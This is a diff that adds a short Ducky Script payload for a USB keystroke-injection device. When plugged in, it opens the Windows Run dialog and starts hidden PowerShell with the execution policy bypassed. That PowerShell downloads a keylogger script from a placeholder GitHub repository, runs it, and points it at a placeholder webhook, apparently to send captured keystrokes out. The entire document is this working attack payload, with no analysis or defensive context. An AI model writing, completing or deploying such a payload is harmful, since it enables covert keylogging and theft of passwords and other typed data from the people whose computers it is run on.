@@ -1,0 +1,5 @@
+DELAY 500
+GUI r
+DELAY 200
+STRING powershell -w hidden -ep bypass -nop -c "irm https://raw.githubusercontent.com/YOUR_USER/YOUR_REPO/main/keylogger.ps1 | iex -webhook 'YOUR_WEBHOOK_URL'"
+ENTER
